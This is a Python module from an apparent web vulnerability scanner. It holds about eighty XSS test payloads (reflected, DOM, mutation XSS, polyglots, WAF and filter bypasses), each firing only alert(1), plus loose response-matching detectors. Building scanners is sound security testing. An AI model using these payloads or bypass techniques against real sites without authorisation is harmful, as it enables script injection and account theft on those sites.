"""
scanner/payloads/xss.py

XSS (Cross-Site Scripting) payloads for vulnerability testing.
Includes: Reflected XSS, DOM-based XSS, Mutation XSS, Filter Bypass,
          Template Literal Injection, SVG/MathML vectors, Polyglots, WAF Bypass
"""

from .base import Payload


def xss_confirm(response_text: str) -> bool:
    """
    Check for XSS patterns in response.
    More comprehensive than exact match.
    """
    xss_indicators = [
        # Script execution
        "<script>",
        "<script ",
        "</script>",
        "javascript:",

        # Event handlers
        "onerror=",
        "onload=",
        "onclick=",
        "onmouseover=",
        "onfocus=",
        "onblur=",
        "onchange=",
        "onsubmit=",
        "onanimationend=",
        "ontransitionend=",
        "onpointerover=",
        "ontoggle=",
        "onbeforeinput=",
        "onformdata=",

        # SVG/HTML injection
        "<svg",
        "<img",
        "<iframe",
        "<body",
        "<input",
        "<math",
        "<video",
        "<audio",
        "<details",
        "<marquee",
        "<object",
        "<embed",

        # Common XSS functions
        "alert(",
        "confirm(",
        "prompt(",
        "eval(",
        "document.cookie",
        "document.location",
        "window.location",
        "document.write",
        "innerhtml",
        "outerhtml",
        "insertadjacenthtml",
    ]

    text_lower = response_text.lower()
    return any(indicator.lower() in text_lower for indicator in xss_indicators)


def xss_context_attribute(response_text: str) -> bool:
    """Check for XSS in HTML attribute context."""
    indicators = [
        '" onload=',
        "' onload=",
        '" onerror=',
        "' onerror=",
        '" onclick=',
        "autofocus onfocus=",
        '" onanimationend=',
        "' ontransitionend=",
        '" onpointerover=',
    ]
    text_lower = response_text.lower()
    return any(ind.lower() in text_lower for ind in indicators)


def xss_context_js(response_text: str) -> bool:
    """Check for XSS in JavaScript context."""
    indicators = [
        "'-alert(",
        '"-alert(',
        ";</script>",
        "//</script>",
        "${alert",
        "`-alert(",
        "\\x3cscript",
    ]
    return any(ind in response_text for ind in indicators)


def xss_dom_confirm(response_text: str) -> bool:
    """Check for DOM-based XSS sinks in response."""
    dom_sinks = [
        "innerhtml",
        "outerhtml",
        "document.write",
        "document.writeln",
        "eval(",
        "settimeout(",
        "setinterval(",
        "function(",
        "execscript",
        "mssetimmediate",
        "insertadjacenthtml",
        "srcdoc",
    ]
    text_lower = response_text.lower()
    return any(sink in text_lower for sink in dom_sinks)


def xss_mutation_confirm(response_text: str) -> bool:
    """Check for mutation XSS (mXSS) patterns."""
    mxss_indicators = [
        "<svg",
        "<math",
        "<!--",
        "<style",
        "<noscript",
        "<textarea",
        "xmlns",
    ]
    text_lower = response_text.lower()
    return any(ind in text_lower for ind in mxss_indicators)


def xss_template_confirm(response_text: str) -> bool:
    """Check for template literal injection."""
    indicators = [
        "${",
        "`",
        "{{",
        "}}",
    ]
    return any(ind in response_text for ind in indicators)


def xss_polyglot_confirm(response_text: str) -> bool:
    """Check for polyglot XSS patterns."""
    return xss_confirm(response_text) or xss_context_js(response_text)


XSS_PAYLOADS = [
    # ============================================
    # BASIC REFLECTED XSS
    # ============================================
    Payload(
        vuln_type="XSS",
        name="Basic script tag",
        payload='<script>alert(1)</script>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="SVG onload",
        payload='"><svg/onload=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="IMG onerror",
        payload='"><img src=x onerror=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Body onload",
        payload='"><body onload=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),

    # ============================================
    # ATTRIBUTE CONTEXT ESCAPING
    # ============================================
    Payload(
        vuln_type="XSS",
        name="Double quote escape",
        payload='" onmouseover="alert(1)" x="',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_context_attribute
    ),
    Payload(
        vuln_type="XSS",
        name="Single quote escape",
        payload="' onmouseover='alert(1)' x='",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_context_attribute
    ),
    Payload(
        vuln_type="XSS",
        name="Autofocus onfocus",
        payload='" autofocus onfocus="alert(1)" x="',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_context_attribute
    ),

    # ============================================
    # JAVASCRIPT CONTEXT
    # ============================================
    Payload(
        vuln_type="XSS",
        name="JS string break single",
        payload="'-alert(1)-'",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_context_js
    ),
    Payload(
        vuln_type="XSS",
        name="JS string break double",
        payload='"-alert(1)-"',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_context_js
    ),
    Payload(
        vuln_type="XSS",
        name="Script tag break",
        payload='</script><script>alert(1)</script>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),

    # ============================================
    # DOM-BASED XSS PAYLOADS
    # ============================================
    Payload(
        vuln_type="XSS",
        name="DOM innerHTML sink",
        payload='<img src=x onerror="document.body.innerHTML=\'XSS\'">',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_dom_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="DOM document.write sink",
        payload='<script>document.write("<img src=x onerror=alert(1)>")</script>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_dom_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="DOM eval sink",
        payload='";eval(atob("YWxlcnQoMSk="));//',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_dom_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="DOM location.hash",
        payload='#<script>alert(1)</script>',
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="DOM setTimeout sink",
        payload='";setTimeout("alert(1)",0);//',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_dom_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="DOM setInterval sink",
        payload='";setInterval("alert(1)",0);//',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_dom_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="DOM outerHTML sink",
        payload='<img src=x onerror="this.outerHTML=\'<script>alert(1)</script>\'">',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_dom_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="DOM insertAdjacentHTML",
        payload='<img src=x onerror="document.body.insertAdjacentHTML(\'beforeend\',\'<script>alert(1)</script>\')">',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_dom_confirm
    ),

    # ============================================
    # MUTATION XSS (mXSS) PAYLOADS
    # ============================================
    Payload(
        vuln_type="XSS",
        name="mXSS SVG foreignObject",
        payload='<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload="alert(1)"></body></foreignObject></svg>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_mutation_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="mXSS math annotation-xml",
        payload='<math><annotation-xml encoding="text/html"><svg onload="alert(1)"></svg></annotation-xml></math>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_mutation_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="mXSS noscript mutation",
        payload='<noscript><img src=x onerror=alert(1)></noscript>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_mutation_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="mXSS style tag mutation",
        payload='<style><style/><script>alert(1)//</script>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_mutation_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="mXSS textarea mutation",
        payload='<textarea><img src=x onerror=alert(1)></textarea>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_mutation_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="mXSS HTML comment mutation",
        payload='<!--<script>-->alert(1)<!--</script>-->',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_mutation_confirm
    ),

    # ============================================
    # FILTER BYPASS - CASE MIXING
    # ============================================
    Payload(
        vuln_type="XSS",
        name="Case variation script",
        payload='<ScRiPt>alert(1)</sCrIpT>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Case variation SVG",
        payload='<SvG oNlOaD=alert(1)>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Case variation IMG",
        payload='<ImG sRc=x OnErRoR=alert(1)>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),

    # ============================================
    # FILTER BYPASS - NULL BYTES
    # ============================================
    Payload(
        vuln_type="XSS",
        name="Null byte script tag",
        payload='<scr\x00ipt>alert(1)</scr\x00ipt>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Null byte event handler",
        payload='<img src=x one\x00rror=alert(1)>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),

    # ============================================
    # FILTER BYPASS - COMMENTS
    # ============================================
    Payload(
        vuln_type="XSS",
        name="HTML comment in tag",
        payload='<script>alert(1)<!--</script>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Comment between event",
        payload='<img src=x onerror/*comment*/=alert(1)>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),

    # ============================================
    # FILTER BYPASS - UNICODE
    # ============================================
    Payload(
        vuln_type="XSS",
        name="Unicode fullwidth",
        payload='\uff1cscript\uff1ealert(1)\uff1c/script\uff1e',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Unicode escape sequence",
        payload='<script>\\u0061lert(1)</script>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Unicode homoglyph",
        payload='<svg onload=\u0430lert(1)>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),

    # ============================================
    # FILTER BYPASS - ENCODING TRICKS
    # ============================================
    Payload(
        vuln_type="XSS",
        name="URL encoded script",
        payload='%3Cscript%3Ealert(1)%3C/script%3E',
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Double URL encoding",
        payload='%253Cscript%253Ealert(1)%253C%252Fscript%253E',
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="HTML entity bypass",
        payload='&lt;script&gt;alert(1)&lt;/script&gt;',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Hex entity encoding",
        payload='&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Decimal entity encoding",
        payload='&#60;script&#62;alert(1)&#60;/script&#62;',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),

    # ============================================
    # TEMPLATE LITERAL INJECTION
    # ============================================
    Payload(
        vuln_type="XSS",
        name="Template literal basic",
        payload='${alert(1)}',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_template_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Template literal with backtick break",
        payload='`-alert(1)-`',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_template_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Template literal nested",
        payload='${`${alert(1)}`}',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_template_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Template literal constructor",
        payload='${constructor.constructor("alert(1)")()}',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_template_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Template literal function call",
        payload='${(function(){alert(1)})()}',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_template_confirm
    ),

    # ============================================
    # SVG/MathML VECTORS
    # ============================================
    Payload(
        vuln_type="XSS",
        name="SVG animate onbegin",
        payload='<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="SVG set onbegin",
        payload='<svg><set onbegin=alert(1) attributeName=x to=x>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="SVG use href",
        payload='<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>#x">',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="SVG script href",
        payload='<svg><script href=data:,alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="MathML script",
        payload='<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">X</maction></math>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="MathML annotation-xml",
        payload='<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="SVG foreignObject iframe",
        payload='<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></foreignObject></svg>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),

    # ============================================
    # MORE EVENT HANDLERS
    # ============================================
    Payload(
        vuln_type="XSS",
        name="onanimationend event",
        payload='<style>@keyframes x{}</style><div style="animation:x" onanimationend=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_context_attribute
    ),
    Payload(
        vuln_type="XSS",
        name="ontransitionend event",
        payload='<style>div{transition:color 1s}div:hover{color:red}</style><div ontransitionend=alert(1)>X</div>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_context_attribute
    ),
    Payload(
        vuln_type="XSS",
        name="onpointerover event",
        payload='<div onpointerover=alert(1)>Hover me</div>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_context_attribute
    ),
    Payload(
        vuln_type="XSS",
        name="onpointerenter event",
        payload='<div onpointerenter=alert(1)>Hover me</div>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="onbeforeinput event",
        payload='<input onbeforeinput=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="onformdata event",
        payload='<form id=f onformdata=alert(1)><input></form><script>f.requestSubmit()</script>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="onsecuritypolicyviolation event",
        payload='<script src=x onsecuritypolicyviolation=alert(1)></script>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="onwheel event",
        payload='<div onwheel=alert(1)>Scroll here</div>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Input autofocus",
        payload='<input autofocus onfocus=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Details ontoggle",
        payload='<details open ontoggle=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Video source error",
        payload='<video><source onerror=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Marquee onstart",
        payload='<marquee onstart=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Audio onerror",
        payload='<audio src=x onerror=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),

    # ============================================
    # POLYGLOT PAYLOADS
    # ============================================
    Payload(
        vuln_type="XSS",
        name="Polyglot classic",
        payload="jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_polyglot_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Polyglot multi-context",
        payload="'-alert(1)-'\"--><script>alert(1)</script><svg/onload=alert(1)>",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_polyglot_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Polyglot quote escape",
        payload="\"'--></style></script><script>alert(1)</script>",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_polyglot_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Polyglot HTML context",
        payload="</script><svg onload=alert(1)>",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_polyglot_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Polyglot JS string",
        payload="';alert(1)//\\';alert(1)//\";alert(1)//\\\";alert(1)//--></script><script>alert(1)</script>",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_polyglot_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="Polyglot template literal",
        payload="`${alert(1)}`\"'--><img src=x onerror=alert(1)>",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_polyglot_confirm
    ),

    # ============================================
    # WAF BYPASS PAYLOADS
    # ============================================
    Payload(
        vuln_type="XSS",
        name="WAF bypass newline",
        payload='<script>\nalert(1)\n</script>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="WAF bypass tab",
        payload='<script\t>alert(1)</script\t>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="WAF bypass forward slash",
        payload='<script/>alert(1)</script>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="WAF bypass backtick",
        payload='<script>`alert(1)`</script>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="WAF bypass constructor",
        payload='<script>[].constructor.constructor("alert(1)")()</script>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="WAF bypass window name",
        payload='<script>eval(name)</script>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="WAF bypass atob",
        payload='<script>eval(atob("YWxlcnQoMSk="))</script>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="WAF bypass String.fromCharCode",
        payload='<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="WAF bypass hex escape",
        payload='<script>\\x61lert(1)</script>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="WAF bypass octal escape",
        payload='<script>\\141lert(1)</script>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="WAF bypass Object prototype",
        payload='<script>Object.prototype.valueOf.call({valueOf:alert})+1</script>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="WAF bypass data URI",
        payload='<object data="data:text/html,<script>alert(1)</script>">',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="WAF bypass srcdoc",
        payload='<iframe srcdoc="<script>alert(1)</script>">',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="WAF bypass javascript URI",
        payload='<a href="javascript:alert(1)">Click</a>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="WAF bypass vbscript",
        payload='<a href="vbscript:alert(1)">Click</a>',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),

    # ============================================
    # ADDITIONAL CONTEXT-SPECIFIC PAYLOADS
    # ============================================
    Payload(
        vuln_type="XSS",
        name="JSON context break",
        payload='"}]};alert(1)//{"a":"b',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=xss_context_js
    ),
    Payload(
        vuln_type="XSS",
        name="Header injection XSS",
        payload='\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>',
        contexts=["header"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="CSS expression",
        payload='x:expression(alert(1))',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="XML CDATA break",
        payload=']]><script>alert(1)</script><![CDATA[',
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=xss_confirm
    ),
]
